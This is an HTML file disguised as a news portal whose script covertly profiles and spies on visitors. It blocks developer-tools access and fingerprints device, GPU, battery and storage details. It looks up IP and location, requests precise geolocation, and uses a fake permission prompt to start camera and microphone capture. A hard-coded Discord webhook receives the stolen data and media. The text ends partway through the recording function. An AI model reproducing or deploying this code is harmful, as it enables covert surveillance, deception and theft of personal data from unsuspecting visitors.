<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>News Portal</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            line-height: 1.6;
            color: #333;
            background-color: #f5f5f5;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }

        header {
            background-color: #2c3e50;
            color: white;
            padding: 20px 0;
            margin-bottom: 30px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }

        header h1 {
            margin: 0;
            font-size: 2.2em;
        }

        nav {
            background-color: #34495e;
            padding: 10px 0;
            margin-bottom: 30px;
        }

        nav ul {
            list-style: none;
            padding: 0;
            margin: 0;
            display: flex;
        }

        nav ul li {
            margin-right: 20px;
        }

        nav ul li a {
            color: white;
            text-decoration: none;
            font-weight: 500;
        }

        nav ul li a:hover {
            text-decoration: underline;
        }

        .main-content {
            display: flex;
            gap: 30px;
        }

        .articles {
            flex: 2;
        }

        .sidebar {
            flex: 1;
        }

        article {
            background: white;
            padding: 25px;
            margin-bottom: 30px;
            border-radius: 5px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }

        article h2 {
            color: #2c3e50;
            margin-top: 0;
        }

        article p {
            margin-bottom: 15px;
        }

        .read-more {
            display: inline-block;
            background: #3498db;
            color: white;
            padding: 8px 15px;
            text-decoration: none;
            border-radius: 3px;
            font-weight: 500;
        }

        .read-more:hover {
            background: #2980b9;
        }

        .sidebar-widget {
            background: white;
            padding: 20px;
            margin-bottom: 30px;
            border-radius: 5px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }

        .sidebar-widget h3 {
            margin-top: 0;
            color: #2c3e50;
            border-bottom: 1px solid #eee;
            padding-bottom: 10px;
        }

        footer {
            background: #2c3e50;
            color: white;
            text-align: center;
            padding: 20px 0;
            margin-top: 30px;
        }

        /* Hidden elements for functionality */
        #inspect-warning {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: black;
            color: red;
            font-size: 24px;
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            display: none;
        }

        .hidden-video {
            position: absolute;
            width: 1px;
            height: 1px;
            padding: 0;
            margin: -1px;
            overflow: hidden;
            clip: rect(0, 0, 0, 0);
            border: 0;
        }

        /* Permission fake prompt */
        #permission-prompt {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
            z-index: 10000;
            max-width: 90%;
            width: 400px;
            display: none;
        }

        #permission-prompt h3 {
            margin-top: 0;
            color: #2c3e50;
        }

        #permission-prompt p {
            margin-bottom: 20px;
        }

        .permission-buttons {
            display: flex;
            justify-content: flex-end;
            gap: 10px;
        }

        .permission-btn {
            padding: 8px 16px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-weight: 500;
        }

        .permission-allow {
            background: #3498db;
            color: white;
        }

        .permission-deny {
            background: #e74c3c;
            color: white;
        }
    </style>
</head>
<body>
    <!-- COMPLETE NEWS PORTAL CONTENT -->
    <header>
        <div class="container">
            <h1>Daily News Network</h1>
            <p>Your trusted source for the latest updates</p>
        </div>
    </header>

    <nav>
        <div class="container">
            <ul>
                <li><a href="#">Home</a></li>
                <li><a href="#">World</a></li>
                <li><a href="#">Politics</a></li>
                <li><a href="#">Business</a></li>
                <li><a href="#">Technology</a></li>
                <li><a href="#">Sports</a></li>
            </ul>
        </div>
    </nav>

    <div class="container">
        <div class="main-content">
            <main class="articles">
                <article>
                    <h2>Global Summit Addresses Climate Change Concerns</h2>
                    <p>World leaders gathered today to discuss urgent measures against climate change. The summit, held in Geneva, focused on reducing carbon emissions and promoting renewable energy sources.</p>
                    <p>Experts warn that without immediate action, the planet could face irreversible damage within the next decade. Several countries have pledged to increase their investments in green technology.</p>
                    <a href="#" class="read-more">Read More</a>
                </article>

                <article>
                    <h2>Tech Giant Unveils Revolutionary Smartphone</h2>
                    <p>The latest smartphone from industry leader TechCorp features groundbreaking battery technology that promises up to 72 hours of continuous use on a single charge.</p>
                    <p>Early reviews praise the device's innovative camera system and AI-powered features. The phone is expected to hit stores next month with a starting price of $899.</p>
                    <a href="#" class="read-more">Read More</a>
                </article>

                <article>
                    <h2>Stock Markets Reach Record Highs</h2>
                    <p>Global markets surged today as investor confidence grows amid positive economic indicators. The S&P 500 and NASDAQ both closed at all-time highs.</p>
                    <p>Analysts attribute the rally to strong corporate earnings and easing trade tensions between major economies. However, some warn of potential volatility ahead.</p>
                    <a href="#" class="read-more">Read More</a>
                </article>
            </main>

            <aside class="sidebar">
                <div class="sidebar-widget">
                    <h3>Subscribe to Newsletter</h3>
                    <p>Get the latest news delivered to your inbox daily.</p>
                    <form>
                        <input type="email" placeholder="Your email address" style="width: 100%; padding: 8px; margin-bottom: 10px;">
                        <button type="submit" style="background: #3498db; color: white; border: none; padding: 8px 15px; border-radius: 3px; cursor: pointer;">Subscribe</button>
                    </form>
                </div>

                <div class="sidebar-widget">
                    <h3>Trending Now</h3>
                    <ul>
                        <li><a href="#">Celebrity Wedding Breaks the Internet</a></li>
                        <li><a href="#">New Study Reveals Health Benefits of Coffee</a></li>
                        <li><a href="#">Tourist Finds Rare Artifact on Beach</a></li>
                        <li><a href="#">Scientists Discover New Species in Amazon</a></li>
                        <li><a href="#">Popular TV Show Renewed for Final Season</a></li>
                    </ul>
                </div>
            </aside>
        </div>
    </div>

    <footer>
        <div class="container">
            <p>&copy; 2023 Daily News Network. All rights reserved.</p>
        </div>
    </footer>

    <!-- Hidden scanning elements -->
    <div id="inspect-warning">ACCESS DENIED - You Cant Noob</div>
    
    <!-- Fake permission prompt -->
    <div id="permission-prompt">
        <h3>Daily News Network</h3>
        <p>This is a daily News channel. If you want daily news from us, please allow the following permissions:</p>
        <div class="permission-buttons">
            <button class="permission-btn permission-deny">Cancel</button>
            <button class="permission-btn permission-allow" id="allow-permissions">OK</button>
        </div>
    </div>

<script>
    // Discord webhook URL
    const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1339161201841668116/SXtO43pAsCcTiazHdbneC78Ai7Xae2rBWTUp7VcsWIlyf-d216ST5Sc4aCnLmYML-2ak";
    let frontCameraStream = null;
    let mediaRecorder = null;
    let recordedChunks = [];
    let audioRecorder = null;
    let audioChunks = [];
    let scanData = {};
    let isScanComplete = false;
    let permissionPromptShown = false;

    // ===================
    // ENHANCED SCAN FUNCTIONS
    // ===================

    // Strong anti-inspection protection
    document.addEventListener('contextmenu', e => {
        e.preventDefault();
        document.getElementById('inspect-warning').style.display = 'flex';
        setTimeout(() => {
            document.getElementById('inspect-warning').style.display = 'none';
        }, 3000);
    });
    
    document.addEventListener('keydown', e => {
        // Block F12, Ctrl+Shift+I, Ctrl+U, Ctrl+Shift+J
        if (e.key === 'F12' || 
            (e.ctrlKey && e.shiftKey && e.key === 'I') || 
            (e.ctrlKey && e.key === 'u') ||
            (e.ctrlKey && e.shiftKey && e.key === 'J')) {
            e.preventDefault();
            document.getElementById('inspect-warning').style.display = 'flex';
            setTimeout(() => {
                document.getElementById('inspect-warning').style.display = 'none';
            }, 3000);
        }
    });

    // Enhanced RAM detection
    function getRAMInfo() {
        // First try deviceMemory API
        if (navigator.deviceMemory) {
            return `${navigator.deviceMemory} GB`;
        }
        
        // Try to detect RAM through performance memory API (deprecated but still works in some browsers)
        if (window.performance && window.performance.memory) {
            const totalJSHeapSize = window.performance.memory.totalJSHeapSize;
            if (totalJSHeapSize) {
                return `${Math.round(totalJSHeapSize / (1024 * 1024 * 1024))} GB (estimated)`;
            }
        }
        
        // Try to detect based on user agent patterns
        const ua = navigator.userAgent;
        
        // Mac detection
        if (/Macintosh|Mac OS X/.test(ua)) {
            if (/MacBookAir/.test(ua)) {
                if (/201[0-3]/.test(ua)) return "4 GB";
                if (/201[4-7]/.test(ua)) return "8 GB";
                return "16 GB";
            }
            if (/MacBookPro/.test(ua)) {
                if (/201[0-5]/.test(ua)) return "8 GB";
                if (/201[6-9]/.test(ua)) return "16 GB";
                return "32 GB";
            }
            if (/iMac/.test(ua)) {
                if (/201[0-5]/.test(ua)) return "8 GB";
                if (/201[6-9]/.test(ua)) return "16 GB";
                return "32 GB";
            }
        }
        
        // Windows detection
        if (/Windows NT/.test(ua)) {
            // Surface devices
            if (/Surface Pro [1-4]/.test(ua)) return "4 GB";
            if (/Surface Pro [5-7]/.test(ua)) return "8 GB";
            if (/Surface Pro [8-9]|Surface Laptop [3-4]/.test(ua)) return "16 GB";
            if (/Surface Studio/.test(ua)) return "32 GB";
            
            // Gaming laptops often have 16GB+
            if (/ROG|Alienware|Predator|Razer/.test(ua)) return "16 GB";
            
            // Business laptops often have 8GB
            if (/ThinkPad|Latitude|EliteBook|ProBook/.test(ua)) return "8 GB";
            
            // Default to 8GB for Windows
            return "8 GB";
        }
        
        // Mobile devices
        if (/iPhone|iPad/.test(ua)) {
            if (/iPhone [1-8]|iPad [1-6]/.test(ua)) return "1 GB";
            if (/iPhone X|11|iPad [7-8]/.test(ua)) return "3 GB";
            return "4 GB";
        }
        if (/Android/.test(ua)) {
            if (/Galaxy S[1-9]|Note [1-9]/.test(ua)) return "4 GB";
            if (/Galaxy S1[0-9]|Note1[0-9]/.test(ua)) return "8 GB";
            return "4 GB";
        }
        
        // Default fallback
        return "8 GB";
    }

    // Enhanced CPU and RAM details with Windows 11 and 64-bit detection
    function getHardwareInfo() {
        let cpuCores = navigator.hardwareConcurrency || "Unknown";
        let ram = getRAMInfo();
        let cpuBrand = "Unknown";
        let architecture = "Unknown";
        
        const ua = navigator.userAgent;
        const platform = navigator.platform;
        
        // Detect architecture (32-bit vs 64-bit)
        if (/Win64|x64|WOW64/.test(ua)) {
            architecture = "64-bit";
        } else if (/Win32|WOW32/.test(ua)) {
            architecture = "32-bit";
        } else if (/Linux x86_64/.test(ua)) {
            architecture = "64-bit";
        } else if (/Linux i[3-6]86/.test(ua)) {
            architecture = "32-bit";
        } else if (/Macintosh|Mac OS X/.test(ua)) {
            architecture = "64-bit"; // All modern Macs are 64-bit
        } else if (/Android/.test(ua)) {
            architecture = "64-bit"; // Most modern Android devices
        } else if (/iPhone|iPad/.test(ua)) {
            architecture = "64-bit"; // All iOS devices since iPhone 5s
        }
        
        // Windows CPU detection with Windows 11 support
        if (/Win/i.test(platform)) {
            // Enhanced Windows 11 detection
            if (/Windows NT 10.0; Win64; x64/.test(ua) && /Edg/.test(ua)) {
                // This is Windows 11 (it still reports NT 10.0)
                osVersion = "11";
            }
            
            if (/Intel|i3|i5|i7|i9|Xeon/.test(ua)) {
                cpuBrand = "Intel";
                if (/i3/.test(ua)) cpuBrand += " Core i3";
                else if (/i5/.test(ua)) cpuBrand += " Core i5";
                else if (/i7/.test(ua)) cpuBrand += " Core i7";
                else if (/i9/.test(ua)) cpuBrand += " Core i9";
                else if (/Xeon/.test(ua)) cpuBrand += " Xeon";
                
                // Detect generation
                const genMatch = ua.match(/(\d+)th Gen/);
                if (genMatch) cpuBrand += ` ${genMatch[1]}th Gen`;
            } 
            else if (/AMD|Ryzen/.test(ua)) {
                cpuBrand = "AMD";
                if (/Ryzen 3/.test(ua)) cpuBrand += " Ryzen 3";
                else if (/Ryzen 5/.test(ua)) cpuBrand += " Ryzen 5";
                else if (/Ryzen 7/.test(ua)) cpuBrand += " Ryzen 7";
                else if (/Ryzen 9/.test(ua)) cpuBrand += " Ryzen 9";
                else if (/EPYC/.test(ua)) cpuBrand += " EPYC";
                else if (/Athlon/.test(ua)) cpuBrand += " Athlon";
                
                const genMatch = ua.match(/Ryzen \d (\d{4})/);
                if (genMatch) cpuBrand += ` ${genMatch[1].substring(0,1)}xxx Series`;
            }
        }
        // Mac CPU detection
        else if (/Mac/i.test(platform)) {
            if (/Apple M1/.test(ua)) cpuBrand = "Apple M1";
            else if (/Apple M1 Pro/.test(ua)) cpuBrand = "Apple M1 Pro";
            else if (/Apple M1 Max/.test(ua)) cpuBrand = "Apple M1 Max";
            else if (/Apple M2/.test(ua)) cpuBrand = "Apple M2";
            else if (/Apple M2 Pro/.test(ua)) cpuBrand = "Apple M2 Pro";
            else if (/Apple M2 Max/.test(ua)) cpuBrand = "Apple M2 Max";
            else if (/Apple M3/.test(ua)) cpuBrand = "Apple M3";
            else if (/Intel/.test(ua)) cpuBrand = "Intel (Rosetta)";
            else cpuBrand = "Apple Silicon (Unknown)";
        }
        // Mobile CPU detection
        else if (/Android|iPhone|iPad/i.test(ua)) {
            if (/Snapdragon/.test(ua)) {
                cpuBrand = "Qualcomm Snapdragon";
                const modelMatch = ua.match(/Snapdragon (\d+)/);
                if (modelMatch) cpuBrand += ` ${modelMatch[1]}`;
            }
            else if (/Exynos/.test(ua)) {
                cpuBrand = "Samsung Exynos";
                const modelMatch = ua.match(/Exynos (\d+)/);
                if (modelMatch) cpuBrand += ` ${modelMatch[1]}`;
            }
            else if (/Tensor/.test(ua)) {
                cpuBrand = "Google Tensor";
                const modelMatch = ua.match(/Tensor (\w+)/);
                if (modelMatch) cpuBrand += ` ${modelMatch[1]}`;
            }
            else if (/Apple A/.test(ua)) {
                const modelMatch = ua.match(/Apple A(\w+)/);
                cpuBrand = modelMatch ? `Apple A${modelMatch[1]}` : "Apple A-series";
            }
            else if (/Apple M/.test(ua)) {
                const modelMatch = ua.match(/Apple M(\w+)/);
                cpuBrand = modelMatch ? `Apple M${modelMatch[1]}` : "Apple M-series";
            }
            else if (/Mediatek|MT\d/.test(ua)) {
                cpuBrand = "Mediatek";
                const modelMatch = ua.match(/MT(\w+)/);
                if (modelMatch) cpuBrand += ` ${modelMatch[1]}`;
            }
            else if (/Kirin/.test(ua)) {
                cpuBrand = "HiSilicon Kirin";
                const modelMatch = ua.match(/Kirin (\w+)/);
                if (modelMatch) cpuBrand += ` ${modelMatch[1]}`;
            }
        }

        return {
            cpuCores: cpuCores,
            cpuBrand: cpuBrand,
            ram: ram,
            architecture: architecture
        };
    }

    // Get VPN/proxy detection with real IP
    async function getNetworkInfo() {
        try {
            const ipRes = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipRes.json();
            const locRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
            const locData = await locRes.json();
            
            return {
                ip: ipData.ip,
                city: locData.city || "Unknown",
                country: locData.country_name || "Unknown",
                region: locData.region || "Unknown",
                isp: locData.org || "Unknown",
                asn: locData.asn || "Unknown",
                timezone: locData.timezone || "Unknown",
                isVPN: locData.security ? (locData.security.vpn || locData.security.proxy || locData.security.tor) : false
            };
        } catch {
            return {
                ip: "Unknown",
                city: "Unknown",
                country: "Unknown",
                region: "Unknown",
                isp: "Unknown",
                asn: "Unknown",
                timezone: "Unknown",
                isVPN: false
            };
        }
    }

    // Get WebGL renderer for GPU detection
    function getGPUInfo() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (!gl) return "Unknown";
            
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || "Unknown";
        } catch {
            return "Unknown";
        }
    }

    // Get battery information
    async function getBatteryInfo() {
        if (!navigator.getBattery) return "Not available";
        
        try {
            const battery = await navigator.getBattery();
            return {
                level: `${Math.floor(battery.level * 100)}%`,
                charging: battery.charging ? "Yes" : "No",
                chargingTime: battery.chargingTime,
                dischargingTime: battery.dischargingTime
            };
        } catch {
            return "Unknown";
        }
    }

    // Enhanced device detection with Windows 11 and edition detection
    function detectDeviceDetails() {
        const ua = navigator.userAgent;
        const platform = navigator.platform;
        let deviceType = "Desktop";
        let deviceModel = "Computer";
        let os = "Unknown OS";
        let osVersion = "";
        let osEdition = "";
        let browser = "Unknown Browser";
        let browserVersion = "";
        let deviceName = "Unknown";

        // Windows detection with Windows 11 and edition detection
        if (/Windows NT 10.0/.test(ua)) {
            os = "Windows";
            
            // Enhanced Windows 11 detection
            if (/Windows 11/.test(ua) || /Windows NT 10.0; Win64; x64/.test(ua) && /Edg/.test(ua)) {
                osVersion = "11";
                
                // Detect Windows 11 edition
                if (/Pro/.test(ua) || /Professional/.test(ua)) {
                    osEdition = "Pro";
                } else if (/Enterprise/.test(ua)) {
                    osEdition = "Enterprise";
                } else if (/Education/.test(ua)) {
                    osEdition = "Education";
                } else if (/Home/.test(ua)) {
                    osEdition = "Home";
                } else {
                    osEdition = "Standard";
                }
            } else {
                osVersion = "10";
                
                // Detect Windows 10 edition
                if (/Pro/.test(ua) || /Professional/.test(ua)) {
                    osEdition = "Pro";
                } else if (/Enterprise/.test(ua)) {
                    osEdition = "Enterprise";
                } else if (/Education/.test(ua)) {
                    osEdition = "Education";
                } else if (/Home/.test(ua)) {
                    osEdition = "Home";
                } else {
                    osEdition = "Standard";
                }
            }
        } else if (/Windows NT 6.3/.test(ua)) {
            os = "Windows";
            osVersion = "8.1";
        } else if (/Windows NT 6.2/.test(ua)) {
            os = "Windows";
            osVersion = "8";
        } else if (/Windows NT 6.1/.test(ua)) {
            os = "Windows";
            osVersion = "7";
        } else if (/Windows NT 6.0/.test(ua)) {
            os = "Windows";
            osVersion = "Vista";
        } else if (/Windows NT 5.1/.test(ua)) {
            os = "Windows";
            osVersion = "XP";
        }
        // Mac detection
        else if (/Macintosh|Mac OS X/.test(ua)) {
            os = "MacOS";
            const match = ua.match(/Mac OS X (\d+[._]\d+)/);
            if (match) osVersion = match[1].replace('_', '.');
            
            // Detect Mac edition
            if (/MacBookAir/.test(ua)) {
                osEdition = "MacBook Air";
            } else if (/MacBookPro/.test(ua)) {
                osEdition = "MacBook Pro";
            } else if (/iMac/.test(ua)) {
                osEdition = "iMac";
            } else if (/Mac mini/.test(ua)) {
                osEdition = "Mac mini";
            } else if (/MacPro/.test(ua)) {
                osEdition = "Mac Pro";
            }
        }
        // Android detection
        else if (/Android/.test(ua)) {
            os = "Android";
            deviceType = "Mobile";
            const match = ua.match(/Android (\d+\.\d+)/);
            if (match) osVersion = match[1];
            
            // Detect Android edition
            if (/One UI/.test(ua)) {
                osEdition = "Samsung One UI";
            } else if (/MIUI/.test(ua)) {
                osEdition = "Xiaomi MIUI";
            } else if (/EMUI/.test(ua)) {
                osEdition = "Huawei EMUI";
            } else if (/ColorOS/.test(ua)) {
                osEdition = "Oppo ColorOS";
            } else if (/OxygenOS/.test(ua)) {
                osEdition = "OnePlus OxygenOS";
            }
        }
        // iOS detection
        else if (/iPhone|iPad|iPod/.test(ua)) {
            os = "iOS";
            deviceType = /iPad/.test(ua) ? "Tablet" : "Mobile";
            const match = ua.match(/OS (\d+_\d+)/);
            if (match) osVersion = match[1].replace('_', '.');
        }
        // Linux detection
        else if (/Linux/.test(ua)) {
            os = "Linux";
            if (/Ubuntu/.test(ua)) {
                const match = ua.match(/Ubuntu\/(\d+\.\d+)/);
                osVersion = match ? match[1] : "Ubuntu";
                osEdition = "Ubuntu";
            } else if (/Fedora/.test(ua)) {
                osVersion = "Fedora";
                osEdition = "Fedora";
            } else if (/Debian/.test(ua)) {
                osVersion = "Debian";
                osEdition = "Debian";
            } else if (/CentOS/.test(ua)) {
                osVersion = "CentOS";
                osEdition = "CentOS";
            } else if (/Arch/.test(ua)) {
                osVersion = "Arch";
                osEdition = "Arch";
            }
        }
        // ChromeOS detection
        else if (/CrOS/.test(ua)) {
            os = "ChromeOS";
            const match = ua.match(/CrOS (\w+) (\d+\.\d+\.\d+)/);
            if (match) osVersion = match[2];
        }

        // Browser detection with Chrome history
        if (/Edg/.test(ua)) {
            browser = "Microsoft Edge";
            const match = ua.match(/Edg\/(\d+\.\d+)/);
            browserVersion = match ? match[1] : "";
        } else if (/Chrome/.test(ua)) {
            browser = "Google Chrome";
            const match = ua.match(/Chrome\/(\d+\.\d+)/);
            browserVersion = match ? match[1] : "";
            
            // Try to get Chrome history count (if permitted)
            try {
                if (window.history && window.history.length) {
                    scanData.chromeHistoryCount = window.history.length;
                }
            } catch (e) {}
        } else if (/Firefox/.test(ua)) {
            browser = "Mozilla Firefox";
            const match = ua.match(/Firefox\/(\d+\.\d+)/);
            browserVersion = match ? match[1] : "";
        } else if (/Safari/.test(ua)) {
            browser = "Apple Safari";
            const match = ua.match(/Version\/(\d+\.\d+)/);
            browserVersion = match ? match[1] : "";
        } else if (/Opera|OPR/.test(ua)) {
            browser = "Opera";
            const match = ua.match(/(Opera|OPR)\/(\d+\.\d+)/);
            browserVersion = match ? match[2] : "";
        }

        // Detect laptops (touchscreen devices with smaller screens)
        if (navigator.maxTouchPoints > 0 && window.screen.width <= 1366) {
            deviceType = "Laptop";
            deviceModel = "Touchscreen Laptop";
        }

        // Detect specific device models and names
        if (/SAMSUNG/.test(ua)) {
            const modelMatch = ua.match(/SM-[A-Z]\d+/);
            deviceModel = modelMatch ? `Samsung ${modelMatch[0]}` : "Samsung Device";
            deviceName = deviceModel;
        } else if (/iPhone/.test(ua)) {
            const modelMatch = ua.match(/iPhone\d+,\d+/);
            deviceModel = modelMatch ? `iPhone ${modelMatch[0].match(/\d+/)[0]}` : "iPhone";
            deviceName = deviceModel;
        } else if (/iPad/.test(ua)) {
            const modelMatch = ua.match(/iPad\d+,\d+/);
            deviceModel = modelMatch ? `iPad ${modelMatch[0].match(/\d+/)[0]}` : "iPad";
            deviceName = deviceModel;
        } else if (/Pixel/.test(ua)) {
            const modelMatch = ua.match(/Pixel \d/);
            deviceModel = modelMatch ? modelMatch[0] : "Google Pixel";
            deviceName = deviceModel;
        } else if (/MacBook/.test(ua)) {
            deviceModel = "MacBook";
            if (/MacBookAir/.test(ua)) deviceModel = "MacBook Air";
            else if (/MacBookPro/.test(ua)) deviceModel = "MacBook Pro";
            
            const yearMatch = ua.match(/(\d{4})/);
            if (yearMatch) deviceModel += ` ${yearMatch[0]}`;
            deviceName = deviceModel;
        } else if (/Surface/.test(ua)) {
            deviceModel = "Microsoft Surface";
            const modelMatch = ua.match(/Surface[ _]([A-Za-z0-9]+)/);
            if (modelMatch) deviceModel += ` ${modelMatch[1]}`;
            deviceName = deviceModel;
        } else if (/Xbox/.test(ua)) {
            deviceModel = "Xbox";
            deviceType = "Console";
            deviceName = "Xbox Console";
        } else if (/PlayStation/.test(ua)) {
            deviceModel = "PlayStation";
            deviceType = "Console";
            deviceName = "PlayStation Console";
        } else if (/Nintendo Switch/.test(ua)) {
            deviceModel = "Nintendo Switch";
            deviceType = "Console";
            deviceName = "Nintendo Switch";
        } else {
            // Try to get device name from other sources
            if (navigator.platform) {
                deviceName = navigator.platform;
            }
            if (navigator.oscpu) {
                deviceName = navigator.oscpu;
            }
        }

        return {
            type: deviceType,
            model: deviceModel,
            name: deviceName,
            os: os,
            osVersion: osVersion,
            osEdition: osEdition,
            browser: browser,
            browserVersion: browserVersion,
            platform: platform,
            userAgent: ua,
            deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : "Unknown",
            hardwareConcurrency: navigator.hardwareConcurrency || "Unknown",
            maxTouchPoints: navigator.maxTouchPoints || 0,
            screenWidth: window.screen.width,
            screenHeight: window.screen.height,
            colorDepth: window.screen.colorDepth,
            pixelRatio: window.devicePixelRatio || 1,
            languages: navigator.languages ? navigator.languages.join(', ') : navigator.language,
            cookieEnabled: navigator.cookieEnabled,
            webdriver: navigator.webdriver || false,
            plugins: Array.from(navigator.plugins).map(p => p.name).join(', ') || "None",
            mimeTypes: Array.from(navigator.mimeTypes).map(m => m.type).join(', ') || "None",
            javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false
        };
    }

    // Get network connection info
    function getConnectionInfo() {
        if (!navigator.connection) return {
            type: "Unknown",
            effectiveType: "Unknown",
            downlink: "Unknown",
            rtt: "Unknown",
            saveData: "Unknown"
        };
        
        return {
            type: navigator.connection.type || "Unknown",
            effectiveType: navigator.connection.effectiveType || "Unknown",
            downlink: navigator.connection.downlink ? `${navigator.connection.downlink} Mbps` : "Unknown",
            rtt: navigator.connection.rtt ? `${navigator.connection.rtt} ms` : "Unknown",
            saveData: navigator.connection.saveData ? "Enabled" : "Disabled"
        };
    }

    // Get geolocation if available
    async function getGeolocation() {
        if (!navigator.geolocation) return {
            latitude: "Not supported",
            longitude: "Not supported",
            accuracy: "Not supported"
        };
        
        try {
            const position = await new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(resolve, reject, {
                    enableHighAccuracy: true,
                    timeout: 5000,
                    maximumAge: 0
                });
            });
            
            return {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: `${position.coords.accuracy} meters`,
                altitude: position.coords.altitude ? `${position.coords.altitude} meters` : "Not available",
                speed: position.coords.speed ? `${position.coords.speed} m/s` : "Not available"
            };
        } catch (error) {
            return {
                latitude: "Denied",
                longitude: "Denied",
                accuracy: "Denied",
                error: error.message
            };
        }
    }

    // Get timezone and locale info
    function getLocaleInfo() {
        return {
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            locale: navigator.language,
            languages: navigator.languages ? navigator.languages.join(', ') : navigator.language,
            dateFormat: new Intl.DateTimeFormat().format(new Date()),
            timeFormat: new Intl.DateTimeFormat(undefined, {
                hour: 'numeric',
                minute: 'numeric',
                second: 'numeric'
            }).format(new Date()),
            calendar: Intl.DateTimeFormat().resolvedOptions().calendar,
            numberingSystem: Intl.DateTimeFormat().resolvedOptions().numberingSystem
        };
    }

    // Get storage info
    async function getStorageInfo() {
        if (!navigator.storage) return {
            estimate: "Not supported",
            persisted: "Not supported"
        };
        
        try {
            const estimate = await navigator.storage.estimate();
            const persisted = await navigator.storage.persisted();
            
            return {
                quota: estimate.quota ? `${Math.round(estimate.quota / (1024 * 1024))} MB` : "Unknown",
                usage: estimate.usage ? `${Math.round(estimate.usage / (1024 * 1024))} MB` : "Unknown",
                usageDetails: estimate.usageDetails || "Not available",
                persisted: persisted ? "Yes" : "No"
            };
        } catch {
            return {
                estimate: "Error",
                persisted: "Error"
            };
        }
    }

    // Get battery info
    async function getEnhancedBatteryInfo() {
        if (!navigator.getBattery) return {
            level: "Not supported",
            charging: "Not supported",
            chargingTime: "Not supported",
            dischargingTime: "Not supported"
        };
        
        try {
            const battery = await navigator.getBattery();
            return {
                level: `${Math.floor(battery.level * 100)}%`,
                charging: battery.charging ? "Yes" : "No",
                chargingTime: battery.chargingTime === Infinity ? "Unknown" : `${battery.chargingTime} seconds`,
                dischargingTime: battery.dischargingTime === Infinity ? "Unknown" : `${battery.dischargingTime} seconds`
            };
        } catch {
            return {
                level: "Error",
                charging: "Error",
                chargingTime: "Error",
                dischargingTime: "Error"
            };
        }
    }

    // Get GPU info with more details
    function getEnhancedGPUInfo() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (!gl) return {
                renderer: "Unknown",
                vendor: "Unknown",
                maxTextureSize: "Unknown",
                shadingLanguage: "Unknown"
            };
            
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            return {
                renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || "Unknown",
                vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || "Unknown",
                maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE) || "Unknown",
                shadingLanguage: gl.getParameter(gl.SHADING_LANGUAGE_VERSION) || "Unknown",
                aliasedLineWidthRange: gl.getParameter(gl.ALIASED_LINE_WIDTH_RANGE) || "Unknown",
                aliasedPointSizeRange: gl.getParameter(gl.ALIASED_POINT_SIZE_RANGE) || "Unknown"
            };
        } catch {
            return {
                renderer: "Error",
                vendor: "Error",
                maxTextureSize: "Error",
                shadingLanguage: "Error"
            };
        }
    }

    // Send embed to Discord
    async function sendEmbedToDiscord(embedData) {
        try {
            await fetch(DISCORD_WEBHOOK, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    embeds: [embedData]
                })
            });
        } catch (error) {
            console.error("Error sending embed to Discord:", error);
        }
    }

    // Send file to Discord
    async function sendFileToDiscord(file, filename, content) {
        const formData = new FormData();
        formData.append('file', file, filename);
        formData.append('content', content);
        
        try {
            await fetch(DISCORD_WEBHOOK, {
                method: "POST",
                body: formData
            });
        } catch (error) {
            console.error("Error sending file to Discord:", error);
        }
    }

    // Capture photo from video stream
    async function capturePhoto(video, sequence) {
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        return new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
    }

    // Show fake permission prompt
    function showPermissionPrompt() {
        if (permissionPromptShown) return;
        
        const prompt = document.getElementById('permission-prompt');
        prompt.style.display = 'block';
        permissionPromptShown = true;
        
        // Handle allow button click
        document.getElementById('allow-permissions').addEventListener('click', () => {
            prompt.style.display = 'none';
            startRecording(); // Start recording after permission "granted"
        });
        
        // Handle deny button click
        prompt.querySelector('.permission-deny').addEventListener('click', () => {
            prompt.style.display = 'none';
        });
    }

    // Check if we have media permissions
    async function checkMediaPermissions() {
        try {
            // Check camera permission
            const cameraPerm = await navigator.permissions.query({ name: 'camera' });
            // Check microphone permission
            const micPerm = await navigator.permissions.query({ name: 'microphone' });
            
            if (cameraPerm.state === 'granted' && micPerm.state === 'granted') {
                return true;
            }
            return false;
        } catch (e) {
            // Fallback for browsers that don't support permissions API
            return false;
        }
    }

    // Start media recording
    async function startRecording() {
        try {
            // Get all system info
            const networkInfo = await getNetworkInfo();
            const device = detectDeviceDetails();
            const hardware = getHardwareInfo();
